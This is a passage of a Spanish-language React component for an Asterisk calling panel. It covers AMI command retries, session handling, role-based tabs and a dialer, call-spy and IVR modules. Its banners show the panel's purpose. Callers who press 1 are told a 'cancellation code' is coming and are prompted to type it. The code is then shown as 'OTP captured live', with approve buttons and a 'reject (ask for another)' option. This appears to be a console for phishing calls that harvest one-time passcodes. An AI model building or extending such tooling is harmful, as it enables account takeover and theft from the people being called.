        // Controlled Retry Mechanism with Exponential Backoff (up to 2 retries max)
        if (retryAttempt < 2) {
          const nextAttempt = retryAttempt + 1;
          const nextDelay = calculateAmiBackoffDelay(nextAttempt);
          const nextSec = Math.round(nextDelay / 1000);
          addLog(
            'AMI',
            `[PROGRAMANDO REINTENTO #${nextAttempt}] Esperando ${nextSec}s con backoff exponencial antes de reintentar...`,
            undefined,
            'pending'
          );
          setTimeout(() => {
            handleExecuteAmiCommand(command, nextAttempt);
          }, nextDelay);
        }
      }
    } catch (err: any) {
      const isTimeout = err.name === 'AbortError';
      const errorMsg = isTimeout ? 'Timeout al conectar al socket AMI (4s)' : (err.message || 'Fallo de conexión');
      recordAmiFailureClient(errorMsg);

      // Controlled Retry Mechanism with Exponential Backoff
      if (retryAttempt < 2) {
        const nextAttempt = retryAttempt + 1;
        const nextDelay = calculateAmiBackoffDelay(nextAttempt);
        const nextSec = Math.round(nextDelay / 1000);
        addLog(
          'AMI',
          `[PROGRAMANDO REINTENTO #${nextAttempt}] Esperando ${nextSec}s con backoff exponencial antes de reintentar...`,
          undefined,
          'pending'
        );
        setTimeout(() => {
          handleExecuteAmiCommand(command, nextAttempt);
        }, nextDelay);
      }
    }
  };

  // Periodic AMI Health Synchronizer with Strict Backoff & Document Visibility
  useEffect(() => {
    if (!isAuthenticated) return;
    const checkAmiHealth = async () => {
      if (typeof document !== 'undefined' && document.hidden) return;

      const now = Date.now();
      const state = amiBackoffRef.current;

      // Strictly obey backoff cooldown: do NOT ping if waiting for nextAllowedTime
      if (state.isBackoffActive && now < state.nextAllowedTime) {
        return;
      }

      try {
        const res = await fetch('/api/asterisk/telemetry/logs');
        if (res.ok) {
          const data = await res.json();
          if (data.amiHealth && data.amiHealth.isCircuitOpen) {
            setAmiBackoff((prev) => ({
              ...prev,
              consecutiveFailures: data.amiHealth.consecutiveFailures,
              currentDelayMs: data.amiHealth.currentDelayMs,
              nextAllowedTime: now + (data.amiHealth.remainingCooldownSec * 1000),
              isBackoffActive: true,
              lastError: data.amiHealth.lastError,
            }));
            setConnectionSettings((prev) => (prev.status === 'error' ? prev : { ...prev, status: 'error' }));
          } else if (data.amiHealth && !data.amiHealth.isCircuitOpen && state.consecutiveFailures > 0) {
            recordAmiSuccessClient();
          }
        }
      } catch (_) {}
    };

    const interval = setInterval(checkAmiHealth, activeTab === 'telemetry' ? 15000 : 30000);
    return () => clearInterval(interval);
  }, [isAuthenticated, activeTab]);

  const handleLogout = () => {
    fetch('/api/auth/logout', { method: 'POST' }).catch(() => {});
    clearAuthToken();
    isStateLoadedRef.current = false;
    isTenantsHydratedRef.current = false;
    lastUserStateVersionRef.current = -1;
    setMyMembership(null);
    setMembershipRequests([]);
    setIsAuthenticated(false);
    try {
      sessionStorage.removeItem('ast_session_active');
      sessionStorage.removeItem('ast20_active_tab');
      localStorage.removeItem('ast_session_user_token');
    } catch (e) {}
    showToast('Has cerrado sesión correctamente.', 'info');
    addLog('SYSTEM', `[LOGOUT] Sesión finalizada por el operador.`);
  };

  const handleLoginSuccess = async (user: SystemUser) => {
    setUsers((prev) => {
      const exists = prev.some((u) => u.id === user.id || u.username === user.username);
      return exists
        ? prev.map((u) => (u.id === user.id || u.username === user.username ? { ...u, ...user } : u))
        : [user, ...prev];
    });
    if (user.effectiveMembership) {
      setMyMembership(user.effectiveMembership);
    }
    setCurrentUserId(user.id);
    setIsAuthenticated(true);
    setActiveTab(
      user.effectiveMembership && !user.effectiveMembership.exempt && !user.effectiveMembership.isActive
        ? 'membership'
        : getDefaultTabForUser(user)
    );
    try {
      sessionStorage.setItem('ast_session_active', 'true');
      localStorage.setItem('ast20_current_user_id', user.id);
    } catch (e) {}
    // Load this user's exclusive server configuration immediately across any browser
    lastUserStateVersionRef.current = -1;
    await fetchUserState(user.id, user.username, true);
    refreshMembershipOverview();
    showToast(`¡Bienvenido, ${user.name}! Configuración exclusiva cargada.`);
    addLog('SYSTEM', `[LOGIN] Configuración cargada para usuario: ${user.name} (${user.username || user.id})`);
  };

  // Guardar pestaña activa en sessionStorage para mantenerla al recargar la página
  useEffect(() => {
    if (!isAuthenticated) return;
    try {
      sessionStorage.setItem('ast20_active_tab', activeTab);
    } catch (_) {}
  }, [isAuthenticated, activeTab]);

  // Restaurar sesión activa si hay token válido y escuchar expiraciones 401
  useEffect(() => {
    const token = getAuthToken();
    if (token) {
      fetch('/api/auth/me')
        .then((r) => (r.ok ? r.json() : null))
        .then((data) => {
          if (data?.success && data.user) {
            setUsers((prev) => {
              const exists = prev.some((u) => u.id === data.user.id || u.username === data.user.username);
              return exists
                ? prev.map((u) => (u.id === data.user.id || u.username === data.user.username ? { ...u, ...data.user } : u))
                : [data.user, ...prev];
            });
            if (data.user.effectiveMembership) {
              setMyMembership(data.user.effectiveMembership);
            }
            setCurrentUserId(data.user.id);
            setIsAuthenticated(true);
            const savedTab = (() => {
              try {
                return sessionStorage.getItem('ast20_active_tab');
              } catch {
                return null;
              }
            })();
            const memLocked = Boolean(
              data.user.effectiveMembership &&
                !data.user.effectiveMembership.exempt &&
                !data.user.effectiveMembership.isActive
            );
            setActiveTab(
              memLocked
                ? 'membership'
                : savedTab && isTabAllowedForUser(savedTab, data.user)
                ? savedTab
                : getDefaultTabForUser(data.user)
            );
          } else {
            clearAuthToken();
          }
        })
        .catch(() => {})
        .finally(() => {
          setIsRestoringSession(false);
        });
    } else {
      setIsRestoringSession(false);
    }

    const onUnauthorized = () => {
      clearAuthToken();
      isStateLoadedRef.current = false;
      isTenantsHydratedRef.current = false;
      lastUserStateVersionRef.current = -1;
      setMyMembership(null);
      setMembershipRequests([]);
      setIsRestoringSession(false);
      setIsAuthenticated(false);
      try {
        sessionStorage.removeItem('ast20_active_tab');
      } catch (_) {}
    };
    window.addEventListener('ast:unauthorized', onUnauthorized);
    return () => window.removeEventListener('ast:unauthorized', onUnauthorized);
  }, []);

  if (isRestoringSession) {
    return (
      <div
        className={`min-h-screen w-full flex items-center justify-center font-sans ${
          theme === 'light' ? 'bg-slate-50 text-slate-800' : 'bg-[#010604] text-slate-200'
        }`}
      >
        <div className="flex flex-col items-center gap-3">
          <RefreshCw className="w-7 h-7 text-emerald-400 animate-spin" />
          <span className="text-xs font-semibold tracking-wide opacity-80">Cargando sesión...</span>
        </div>
      </div>
    );
  }

  // --------------------------------------------------------------------------
  // PANTALLA DE LOGIN: PRIMERA PANTALLA MOSTRADA PARA ACCEDER AL SISTEMA
  // (Panel de login ubicado al lado izquierdo según requerimiento)
  // --------------------------------------------------------------------------
  if (!isAuthenticated) {
    return (
      <div className="cyber-login-page cyber-login-wrapper min-h-screen font-sans bg-black text-slate-100 selection:bg-emerald-500/30 selection:text-white">
        {toastMessage && (
          <div className="fixed bottom-5 right-5 z-50 flex items-center space-x-2 px-4 py-3 rounded-xl bg-slate-900 border border-emerald-500/40 text-white shadow-2xl animate-bounce">
            <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
            <span className="text-xs font-semibold">{toastMessage.text}</span>
          </div>
        )}

        <LoginScreen
          users={users}
          connectionSettings={connectionSettings}
          onLogin={handleLoginSuccess}
        />
      </div>
    );
  }

  // --------------------------------------------------------------------------
  // SISTEMA PRINCIPAL: MENÚ AL LADO IZQUIERDO (SIDEBAR)
  // --------------------------------------------------------------------------
  return (
    <div className={`min-h-screen flex flex-row font-sans transition-colors ${
      theme === 'light'
        ? 'theme-light bg-slate-50 text-slate-900 selection:bg-blue-500/20 selection:text-blue-900'
        : 'bg-black text-slate-100 selection:bg-emerald-500/30 selection:text-white'
    }`}>
      {/* Toast Notification */}
      {toastMessage && (
        <div className="fixed bottom-5 right-5 z-50 flex items-center space-x-2 px-4 py-3 rounded-xl bg-slate-900 border border-emerald-500/40 text-white shadow-2xl animate-bounce">
          <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
          <span className="text-xs font-semibold">{toastMessage.text}</span>
        </div>
      )}

      {/* MENÚ DE NAVEGACIÓN AL LADO IZQUIERDO (SIDEBAR) */}
      <Sidebar
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        connectionSettings={connectionSettings}
        currentUser={currentUser}
        onQuickSync={handleQuickSync}
        onLogout={handleLogout}
        isSyncing={isSyncing}
        isOpenMobile={isMobileSidebarOpen}
        onCloseMobile={() => setIsMobileSidebarOpen(false)}
        extensionCount={extensions.length}
        carrierCount={carriers.length}
        activeCallCount={activeCallCount}
        theme={theme}
        onToggleTheme={handleToggleTheme}
        amdEnabled={amdEnabled}
        onOpenAmdModal={() => setIsAmdModalOpen(true)}
        myMembership={myMembership}
        pendingMembershipRequestsCount={pendingMembershipRequestsCount}
        isMembershipLocked={isMembershipLocked}
      />

      {/* ÁREA DE CONTENIDO PRINCIPAL A LA DERECHA */}
      <div className="flex-1 flex flex-col min-w-0 min-h-screen">
        <Header
          activeTab={activeTab}
          setActiveTab={setActiveTab}
          connectionSettings={connectionSettings}
          currentUser={currentUser}
          onQuickSync={handleQuickSync}
          onOpenMobileMenu={() => setIsMobileSidebarOpen(true)}
          onLogout={handleLogout}
          isSyncing={isSyncing}
          activeCallCount={activeCallCount}
          theme={theme}
          onToggleTheme={handleToggleTheme}
          myMembership={myMembership}
        />

        <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6">
        {isMembershipLocked ? (
          <MembershipTab
            currentUser={currentUser}
            myMembership={myMembership}
            settings={membershipSettings}
            users={users}
            tenants={tenants}
            requests={membershipRequests}
            onRefresh={refreshMembershipOverview}
            lockMode={true}
            onLogout={handleLogout}
            onShowToast={showToast}
          />
        ) : (
        <>
        {/* Guard de Seguridad RBAC en caso de acceso no autorizado a una pestaña */}
        {!isTabAllowedForUser(activeTab, currentUser) && (
          <div className="p-8 max-w-xl mx-auto my-12 bg-slate-900 border-2 border-rose-500/40 rounded-2xl text-center space-y-4 shadow-2xl">
            <div className="w-16 h-16 rounded-2xl bg-rose-500/20 border border-rose-500/40 flex items-center justify-center mx-auto text-rose-400">
              <ShieldAlert className="w-8 h-8" />
            </div>
            <h2 className="text-xl font-bold text-white">Acceso Denegado</h2>
            <p className="text-xs text-slate-300 leading-relaxed">
              Tu usuario actual (<strong className="text-white">{currentUser?.name || 'Usuario'}</strong> - Rol: <strong className="text-amber-400 uppercase font-mono">{currentUser?.role || 'Agente'}</strong>) no cuenta con permisos para acceder al módulo <strong className="text-white uppercase font-mono">{activeTab}</strong>.
            </p>
            <div className="pt-2">
              <button
                type="button"
                onClick={() => setActiveTab(getDefaultTabForUser(currentUser))}
                className="px-5 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-xs shadow-lg transition-all cursor-pointer"
              >
                Volver a Operaciones de Llamadas
              </button>
            </div>
          </div>
        )}

        {activeTab === 'production' && isTabAllowedForUser('production', currentUser) && (
          <ProductionOperationsTab
            extensions={extensions}
            carriers={carriers}
            audios={audios}
            currentUser={currentUser}
            tenants={tenants}
            onAddAudio={handleAddAudio}
            onTriggerSync={handleQuickSync}
            onNavigateToLiveCalls={() => setActiveTab('live-calls')}
            isSyncing={isSyncing}
            amdEnabled={amdEnabled}
            isTogglingAmd={isTogglingAmd}
            onToggleAmd={handleToggleAmd}
            globalOtpRecords={globalOtpRecords}
            globalLiveCalls={globalLiveCalls}
          />
        )}

        {activeTab === 'manual-dialer' && isTabAllowedForUser('manual-dialer', currentUser) && (
          <ManualDialerTab
            extensions={extensions}
            carriers={carriers}
            tenants={tenants}
            currentUser={currentUser}
            audios={audios}
            onNavigateToLiveCalls={() => setActiveTab('live-calls')}
          />
        )}

        {activeTab === 'live-calls' && isTabAllowedForUser('live-calls', currentUser) && (
          <LiveCallsTab
            extensions={extensions}
            currentUser={currentUser}
            globalLiveCalls={globalLiveCalls}
            globalLiveCallsUpdatedAt={globalLiveCallsUpdatedAt}
            globalOtpAlert={globalOtpAlert}
            globalOtpRecords={globalOtpRecords}
            onGlobalOtpDecision={handleQuickOtpDecision}
            onRefreshLiveTelemetry={refreshLiveTelemetry}
            onNavigateToProduction={() => setActiveTab('production')}
          />
        )}

        {activeTab === 'call-spy' && isTabAllowedForUser('call-spy', currentUser) && (
          <CallSpyMonitorTab
            extensions={extensions}
            carriers={carriers}
            users={users}
            tenants={tenants}
            currentUser={currentUser}
            onUpdateExtension={handleUpdateExtension}
            onTriggerSync={handleQuickSync}
            onNavigateToLiveCalls={() => setActiveTab('live-calls')}
            onNavigateToProduction={() => setActiveTab('production')}
          />
        )}

        {activeTab === 'extensions' && isTabAllowedForUser('extensions', currentUser) && (
          <ExtensionsTab
            extensions={extensions}
            onAddExtension={handleAddExtension}
            onUpdateExtension={handleUpdateExtension}
            onDeleteExtension={handleDeleteExtension}
            onSimulateQualify={handleSimulateQualify}
            onSyncAsterisk={() => handleQuickSync(extensions)}
            onResetDefaultExtensions={handleResetDefaultExtensions}
            isSyncing={isSyncing}
          />
        )}

        {activeTab === 'tenants' && isTabAllowedForUser('tenants', currentUser) && (
          <TenantsTab
            tenants={tenants}
            onAddTenant={handleAddTenant}
            onUpdateTenant={handleUpdateTenant}
            onDeleteTenant={handleDeleteTenant}
            onRechargeTenant={handleRechargeTenant}
            onAutoProvisionExtensions={handleAutoProvisionExtensions}
            extensions={extensions}
            carriers={carriers}
            users={users}
            currentUser={currentUser}
            onSyncAsterisk={() => handleQuickSync(extensions, carriers)}
            onNavigateToManualDialer={() => setActiveTab('manual-dialer')}
            onManageMembership={() => setActiveTab('membership')}
          />
        )}

        {activeTab === 'carriers' && isTabAllowedForUser('carriers', currentUser) && (
          <CarriersTab
            carriers={carriers}
            onAddCarrier={handleAddCarrier}
            onUpdateCarrier={handleUpdateCarrier}
            onDeleteCarrier={handleDeleteCarrier}
            onPingCarrier={handlePingCarrier}
            onToggleCarrier={handleToggleCarrier}
            onReorderCarriers={handleReorderCarriers}
            onSyncAsterisk={() => handleQuickSync(extensions, carriers)}
            isSyncing={isSyncing}
          />
        )}

        {activeTab === 'ivr' && isTabAllowedForUser('ivr', currentUser) && (
          <IVRStudioTab
            press1Config={press1Config}
            otpConfig={otpConfig}
            extensions={extensions}
            audios={audios}
            currentUser={currentUser}
            onSavePress1={setPress1Config}
            onSaveOtp={setOtpConfig}
            onTriggerSync={handleQuickSync}
            isSyncing={isSyncing}
          />
        )}

        {activeTab === 'audios' && isTabAllowedForUser('audios', currentUser) && (
          <AudioLibraryTab
            audios={audios}
            tenants={tenants}
            currentUser={currentUser}
            onAddAudio={handleAddAudio}
            onDeleteAudio={handleDeleteAudio}
            onAssignToPress1={handleAssignToPress1}
            onAssignToOtp={handleAssignToOtp}
            onAssignToAgentTransfer={handleAssignToAgentTransfer}
            activeAssignments={activeAudioAssignments}
            onAssignRole={handleAssignRole}
            lockedConfigs={manualLocks}
            onToggleLock={handleToggleManualLock}
          />
        )}

        {activeTab === 'users' && isTabAllowedForUser('users', currentUser) && (
          <UsersTab
            users={users}
            extensions={extensions}
            carriers={carriers}
            tenants={tenants}
            currentUserId={currentUserId}
            currentUser={currentUser}
            onSwitchUser={handleSwitchUser}
            onAddUser={handleAddUser}
            onUpdateUser={handleUpdateUser}
            onDeleteUser={handleDeleteUser}
            onAddExtension={handleAddExtension}
            onNavigateToProduction={() => setActiveTab('production')}
            onManageMembership={() => setActiveTab('membership')}
            onRefreshMembership={refreshMembershipOverview}
          />
        )}

        {activeTab === 'membership' && isTabAllowedForUser('membership', currentUser) && (
          <MembershipTab
            currentUser={currentUser}
            myMembership={myMembership}
            settings={membershipSettings}
            users={users}
            tenants={tenants}
            requests={membershipRequests}
            onRefresh={refreshMembershipOverview}
            lockMode={false}
            onLogout={handleLogout}
            onShowToast={showToast}
          />
        )}

        {activeTab === 'telemetry' && isTabAllowedForUser('telemetry', currentUser) && (
          <ServerTelemetryTab
            logs={logs}
            onClearLogs={() => setLogs([])}
            onExecuteAmiCommand={handleExecuteAmiCommand}
            onForceFullSync={handleQuickSync}
            isSyncing={isSyncing}
          />
        )}
        </>
        )}
      </main>
      </div>

      {/* Floating Press-1 Cancel Code Alert Banner across non-production/non-live tabs */}
      {(() => {
        if (isMembershipLocked || activeTab === 'production' || activeTab === 'live-calls') return null;
        const pendingCancelCall = globalLiveCalls.find(
          (c: any) =>
            c.status === 'pressed_1' &&
            c.mode === 'cancel_code' &&
            !c.capturedOtp &&
            !dismissedCancelPress1Keys.includes(`${c.id || c.number}_press1_cancel`)
        );
        if (!pendingCancelCall) return null;
        const cancelKey = `${pendingCancelCall.id || pendingCancelCall.number}_press1_cancel`;
        return (
          <div
            className={`fixed right-6 z-50 max-w-sm w-full bg-slate-950 border-2 border-amber-400 rounded-2xl p-4 shadow-2xl shadow-amber-500/30 text-white ${
              globalOtpAlert ? 'bottom-[310px]' : 'bottom-6'
            }`}
          >
            <div className="flex items-center justify-between gap-2 mb-2 pb-2 border-b border-amber-500/30">
              <div className="flex items-center gap-2">
                <BellRing className="w-4 h-4 text-amber-400 animate-bounce" />
                <span className="text-xs font-black uppercase tracking-wider text-amber-300">
                  ¡Cliente Marcó 1! — Envía Código
                </span>
              </div>
              <button
                onClick={() => setDismissedCancelPress1Keys((prev) => [...prev, cancelKey])}
                className="p-1 rounded-md text-slate-400 hover:text-white hover:bg-slate-800 cursor-pointer"
                title="Cerrar aviso"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="mb-3">
              <div className="text-[11px] text-slate-400">Número esperando en línea:</div>
              <div className="text-sm font-mono font-black text-white">{pendingCancelCall.number}</div>
              <p className="text-[11px] text-amber-200/90 mt-1 leading-snug">
                El cliente escuchó: <em>&quot;Un momento por favor, le estamos enviando un código de cancelación&quot;</em>. Envíale el código y pulsa el botón para que lo digite:
              </p>
            </div>

            <div className="space-y-2">
              <button
                type="button"
                disabled={sendingCancelBannerNum === pendingCancelCall.number}
                onClick={() => handleGlobalCancelCodeSent(pendingCancelCall.number, pendingCancelCall.agent)}
                className="w-full flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs transition-all cursor-pointer shadow-md shadow-emerald-500/25 disabled:opacity-50"
              >
                <Send className="w-3.5 h-3.5" />
                <span>
                  {sendingCancelBannerNum === pendingCancelCall.number
                    ? 'Activando...'
                    : 'Ya Envié el Código → Pedir que Digite'}
                </span>
              </button>
              <button
                type="button"
                onClick={() => setActiveTab('production')}
                className="w-full flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold text-xs transition-all cursor-pointer"
              >
                <PhoneCall className="w-3.5 h-3.5 text-amber-400" />
                <span>Ir al Centro de Llamadas</span>
              </button>
            </div>
          </div>
        );
      })()}

      {/* Floating OTP Notification Banner (Hidden in production & live-calls since both render dedicated OTP consoles) */}
      {!isMembershipLocked && globalOtpAlert && activeTab !== 'production' && activeTab !== 'live-calls' && (
        <div className="fixed bottom-6 right-6 z-50 max-w-sm w-full bg-slate-950 border-2 border-emerald-500 rounded-2xl p-4 shadow-2xl shadow-emerald-500/30 text-white">
          <div className="flex items-center justify-between gap-2 mb-2 pb-2 border-b border-emerald-500/20">
            <div className="flex items-center gap-2">
              <span className="relative flex h-3 w-3">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
              </span>
              <span className="text-xs font-black uppercase tracking-wider text-emerald-400">
                OTP Capturado en Vivo
              </span>
            </div>
            <button
              onClick={() => {
                setDismissedOtpKey(`${globalOtpAlert.id}_${globalOtpAlert.otp}`);
                setGlobalOtpAlert(null);
              }}
              className="p-1 rounded-md text-slate-400 hover:text-white hover:bg-slate-800"
              title="Cerrar aviso"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          <div className="flex items-center justify-between mb-3">
            <div>
              <div className="text-[11px] text-slate-400">Número destino:</div>
              <div className="text-xs font-mono font-bold text-slate-200">{globalOtpAlert.number}</div>
            </div>
            <div className="text-right">
              <div className="text-[10px] text-slate-400">{globalOtpAlert.timestamp}</div>
            </div>
          </div>

          <div className="flex items-center justify-center gap-1.5 py-2 mb-3 bg-slate-900/90 rounded-xl border border-emerald-500/30">
            {globalOtpAlert.otp.split('').map((d, i) => (
              <span
                key={i}
                className="w-8 h-10 flex items-center justify-center text-xl font-mono font-black text-emerald-400 bg-slate-950 rounded-lg border border-emerald-500/40"
              >
                {d}
              </span>
            ))}
          </div>

          {/* Quick Decision Action Buttons for Agent */}
          <div className="grid grid-cols-2 gap-2 mb-2.5">
            <button
              onClick={() => handleQuickOtpDecision('valid')}
              className={`flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
                globalOtpAlert.status === 'valid'
                  ? 'bg-emerald-500 text-slate-950 font-black'
                  : 'bg-emerald-600/90 hover:bg-emerald-500 text-white shadow-md shadow-emerald-950'
              }`}
            >
              <Check className="w-3.5 h-3.5" />
              <span>{globalOtpAlert.status === 'valid' ? 'Aprobado ✓' : 'Aprobar (Válido)'}</span>
            </button>
            <button
              onClick={() => handleQuickOtpDecision('invalid')}
              className={`flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
                globalOtpAlert.status === 'invalid'
                  ? 'bg-rose-500 text-white font-black'
                  : 'bg-rose-600/80 hover:bg-rose-500 text-white shadow-md shadow-rose-950'
              }`}
            >
              <X className="w-3.5 h-3.5" />
              <span>{globalOtpAlert.status === 'invalid' ? 'Rechazado ✕' : 'Rechazar (Pedir otro)'}</span>
            </button>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => handleCopyOtp(globalOtpAlert.otp)}
              className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-800 hover:bg-slate-700 text-white border border-slate-700 transition-all cursor-pointer"
            >
              {copiedOtp ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copiedOtp ? 'Copiado' : 'Copiar'}</span>
            </button>
            <button
              onClick={() => setActiveTab('production')}
              className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all cursor-pointer"
            >
              <KeyRound className="w-3.5 h-3.5 text-emerald-400" />
              <span>Ver en Panel</span>
            </button>
          </div>
        </div>
      )}

      {/* AMD Answering Machine Detection Modal */}
      <AmdConfigModal
        isOpen={isAmdModalOpen}
        onClose={() => setIsAmdModalOpen(false)}
        amdEnabled={amdEnabled}
        isToggling={isTogglingAmd}
        feedback={amdFeedback}
        onToggleAmd={handleToggleAmd}
      />

    </div>
  );
}

